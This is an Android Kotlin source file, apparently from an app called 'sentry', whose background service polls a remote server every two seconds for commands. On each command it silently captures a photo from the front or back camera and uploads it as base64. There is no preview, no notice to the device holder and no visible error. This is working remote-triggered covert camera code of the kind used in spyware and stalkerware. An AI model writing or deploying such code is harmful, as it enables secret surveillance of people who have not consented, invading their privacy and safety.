package com.example.sentry.service

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream

object BackgroundCameraManager {
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            while (isActive) {
                try {
                    val res = client.pollCameraCommand()
                    if (res.isSuccess) {
                        val cmd = res.getOrNull()
                        if (!cmd.isNullOrBlank()) {
                            capturePhoto(context, cmd) { base64 ->
                                scope.launch {
                                    client.uploadPhoto(cmd, base64)
                                }
                            }
                        }
                    }
                } catch (_: Exception) {
                }
                delay(2000)
            }
        }
    }

    private fun capturePhoto(context: Context, cameraFacing: String, onCaptured: (String) -> Unit) {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
            val targetFacing = if (cameraFacing.equals("front", ignoreCase = true)) {
                CameraCharacteristics.LENS_FACING_FRONT
            } else {
                CameraCharacteristics.LENS_FACING_BACK
            }

            var selectedCameraId: String? = null
            for (id in cameraManager.cameraIdList) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) {
                    selectedCameraId = id
                    break
                }
            }

            if (selectedCameraId == null) {
                selectedCameraId = cameraManager.cameraIdList.firstOrNull() ?: return
            }

            val handlerThread = HandlerThread("BackgroundCamera").apply { start() }
            val handler = Handler(handlerThread.looper)

            val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    onCaptured(base64)
                    handlerThread.quitSafely()
                } catch (e: Exception) {
                    handlerThread.quitSafely()
                }
            }, handler)

            try {
                cameraManager.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        try {
                            val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(imageReader.surface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                            }
                            camera.createCaptureSession(
                                listOf(imageReader.surface),
                                object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        try {
                                            session.capture(captureBuilder.build(), object : CameraCaptureSession.CaptureCallback() {
                                                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                                                    super.onCaptureCompleted(session, request, result)
                                                    camera.close()
                                                }
                                            }, handler)
                                        } catch (_: Exception) {
                                            camera.close()
                                            handlerThread.quitSafely()
                                        }
                                    }

                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        camera.close()
                                        handlerThread.quitSafely()
                                    }
                                },
                                handler
                            )
                        } catch (_: Exception) {
                            camera.close()
                            handlerThread.quitSafely()
                        }
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        handlerThread.quitSafely()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        handlerThread.quitSafely()
                    }
                }, handler)
            } catch (_: SecurityException) {
                handlerThread.quitSafely()
            }
        } catch (_: Exception) {
        }
    }
}
